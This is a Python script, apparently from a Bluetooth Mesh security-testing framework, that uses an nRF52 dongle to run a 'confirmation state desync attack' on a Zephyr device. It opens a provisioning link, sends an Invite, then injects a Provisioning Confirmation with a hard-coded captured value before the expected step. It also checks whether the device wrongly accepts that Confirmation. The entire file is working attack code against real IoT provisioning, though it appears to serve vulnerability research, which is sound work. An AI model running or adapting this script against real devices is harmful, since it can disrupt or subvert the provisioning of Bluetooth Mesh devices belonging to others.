import sys
import os
import random
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))+"/../")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/boofuzz/")

from colorama import Fore
from Transfer.Send_Packet.BluetoothMesh_SUL import BluetoothMesh_SUL
from Transfer.Config.Zerphy import config
from Transfer.libs.driver.NRF52_dongle import NRF52Dongle
# from scapy.utils import hexdump


port_name = config.device["port_name"]
logs_pcap = config.device["logs_pcap"]
pcap_filename = config.device["pcap_filename"]
key_path = config.device["key_path"]
unprovisioned_device_address = config.device["unprovisioned_device_address"]
iat = config.device["iat"]
rat = config.device["rat"]
role = config.device["role"]
rx_len = config.device["rx_len"]
tx_len = config.device["tx_len"]
logger_handle = config.device["log_path"]
algorithm = config.device["algorithm"]


def create_confirmation_with_value(blemesh_sul, confirmation_value: bytes):
    """
    create Provisioning Confirmation message with specified Confirmation value（support fragmentation）
    get original confirmation fragments from packet_construction, overwrite with the specified confirmation_value
    """
    pkt = blemesh_sul.packet_construction.pbadv.PROVISIONING_CONFIRMATION()
    pkt["Provisioning_Confirmation"].Confirmation = confirmation_value
    # pkt.show2()
    pkt_list = blemesh_sul.packet_construction.pbadv_handle.fragment(pkt)
    # print(pkt_list)
    return pkt_list


def confirmation_state_desync_attack(blemesh_sul):
    
    

  
    captured_confirmation = bytes.fromhex(
        "e6e7311582b93e8a252c7587d8941ddd61cbbd4437637e18d2472c168ecbfe2c"
    )
    confirmation_pkt = create_confirmation_with_value(blemesh_sul, captured_confirmation)
    



    print(Fore.RED + "step3: attack - send Confirmation（error state）before Start")
    print()
    
    
    # blemesh_sul.pre()
    link_open_pkt3 = blemesh_sul.get_pkt("link_open_message_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt3)

    
    invite_pkt3 = blemesh_sul.get_pkt("provisioning_invite_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=invite_pkt3)
 
    
    capabilities_pkt3 = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=capabilities_pkt3)
 
    

    
    confirmation_pkt3 = create_confirmation_with_value(blemesh_sul, captured_confirmation)
    
    try:
        receive_pkt = blemesh_sul.packet_send_received_control(
            send_pkt=confirmation_pkt3
        )
        
        if receive_pkt and receive_pkt != "empty":
            print(Fore.YELLOW + "⚠ received response")
            print(Fore.YELLOW + f"    -> response: {receive_pkt}")
            print(Fore.RED + "    ⚠ warning: the device accepted the Confirmation in a very early state!")
        else:
            print(Fore.GREEN + "✓ no response（the device may have correctly rejected the error state Confirmation）")
    except Exception as e:
        print(Fore.RED + f"✗ exception: {str(e)}")




# 主程序
blemesh_sul = BluetoothMesh_SUL(NRF52Dongle(port_name=port_name, logs_pcap=logs_pcap, pcap_filename=pcap_filename),
                                unprovisioned_device_address,
                                iat=iat,
                                rat=rat,
                                role=role,
                                rx_len=rx_len,
                                tx_len=tx_len,
                                logger_handle=logger_handle,
                                key_path=key_path,
                                algorithm=algorithm)

device_state = blemesh_sul.pre()

print(device_state)

if device_state == "unprovisioned_device_beacon_pkt":
    print(Fore.GREEN + "Device found, starting state desync attack")
    receive_pkt = ""
    while "Link_ACK_Message" not in receive_pkt:        
        pkt = blemesh_sul.get_pkt("link_open_message_pkt")
        receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
        print(receive_pkt)
    print(Fore.GREEN + "Link_ACK_Message received")
    confirmation_state_desync_attack(blemesh_sul)
elif device_state == "secure_network_beacon_pkt":
    print(Fore.GREEN + "Device found, already in secure network")
    print(Fore.YELLOW + "State desync attack requires unprovisioned device")
else:
    print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
    confirmation_state_desync_attack(blemesh_sul)

# blemesh_sul.post()


